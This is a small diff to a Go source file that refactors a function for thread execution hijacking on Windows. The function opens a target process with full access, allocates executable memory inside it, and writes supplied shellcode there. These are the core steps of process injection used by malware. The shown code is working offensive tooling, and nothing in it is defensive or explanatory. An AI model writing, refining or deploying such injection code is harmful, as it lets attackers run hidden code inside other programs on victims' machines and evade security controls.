@@ -5,8 +5,8 @@ import (
 	"unsafe"
 )
 
-// Function to carry out thread execution hijacking on a process with Administrator privileges
-func HijackThreadAdmin(targetProcessID uint32, targetThreadID uint32, targetAddress uintptr, Shellcode []byte) error {
+// Function to carry out thread execution hijacking on a process
+func HijackThread(targetProcessID uint32, targetThreadID uint32, targetAddress uintptr, shellcode []byte) error {
 	// Open the target process
 	processHandle, err := syscall.OpenProcess(PROCESS_ALL_ACCESS, false, targetProcessID)
 	if err != nil {
@@ -35,10 +35,10 @@ func HijackThreadAdmin(targetProcessID uint32, targetThreadID uint32, targetAddr
 	}
 
 	// Allocate memory in the target process
-	addr, _, err := VirtualAllocEx.Call(
+	addr, _, err := ProcVirtualAllocEx.Call(
 		uintptr(processHandle),
 		0,
-		uintptr(len(Shellcode)),
+		uintptr(len(shellcode)),
 		MEM_COMMIT|MEM_RESERVE,
 		syscall.PAGE_EXECUTE_READWRITE,
 	)
@@ -47,11 +47,11 @@ func HijackThreadAdmin(targetProcessID uint32, targetThreadID uint32, targetAddr
 	}
 
 	// Write the shellcode to the allocated memory
-	_, _, err = WriteProcessMemory.Call(
+	_, _, err = ProcWriteProcessMemory.Call(
 		uintptr(processHandle),
 		addr,
-		uintptr(unsafe.Pointer(&Shellcode[0])),
-		uintptr(len(Shellcode)),
+		uintptr(unsafe.Pointer(&shellcode[0])),
+		uintptr(len(shellcode)),
 		0,
 	)
 	if err != nil {
